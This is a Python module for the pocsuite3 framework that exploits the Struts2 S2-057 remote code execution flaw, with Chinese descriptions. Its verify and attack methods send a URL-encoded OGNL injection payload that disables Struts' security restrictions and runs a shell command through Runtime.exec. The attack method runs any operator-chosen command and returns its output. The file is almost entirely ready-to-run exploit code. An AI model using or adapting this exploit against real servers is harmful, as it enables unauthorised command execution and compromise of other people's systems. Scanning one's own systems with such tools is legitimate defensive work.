from collections import OrderedDict
from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.0.4 - 2.3.34, 2.5.0-2.5.16,'
    name = 'Struts2-057远程代码执行'
    desc = '''Struts2-057远程代码执行'''
    pocDesc = '''Struts2-057远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://github.com/vulhub/vulhub/blob/master/struts2/s2-057/README.zh-cn.md']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):

        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        payload = r"/struts2-showcase/"+"%24%7B%0A(%23dm%3D%40ognl" \
            r".OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B's" \
            r"truts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensympho" \
            r"ny.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInsta" \
            r"nce(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou." \
            r"getExcludedPackageNames().clear()).(%23ou.getExcludedClasses()" \
            r".clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang." \
            r"Runtime%40getRuntime().exec('RECOMMAND')).(%40org.apache.commo" \
            r"ns.io.IOUtils%40toString(%23a.getInputStream()))%7D"+"/actionC" \
            r"hain1.action"
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload
        flag = "VuLnEcHoPoCSuCCeSS"

        try:
            response = requests.get(url, headers=HEADERS)
            if response and response.status_code == 200 and flag in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):

        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = self.get_option("command")
        payload = r"/struts2-showcase/"+"%24%7B%0A(%23dm%3D%40ognl" \
            r".OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B's" \
            r"truts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensympho" \
            r"ny.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInsta" \
            r"nce(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou." \
            r"getExcludedPackageNames().clear()).(%23ou.getExcludedClasses()" \
            r".clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang." \
            r"Runtime%40getRuntime().exec('RECOMMAND')).(%40org.apache.commo" \
            r"ns.io.IOUtils%40toString(%23a.getInputStream()))%7D"+"/actionC" \
            r"hain1.action"
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload

        try:
            response = requests.get(url, headers=HEADERS, allow_redirects=False)
            if response and response.status_code == 302:
                result['Stdout'] = response.headers['location']
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)


register_poc(DemoPOC)
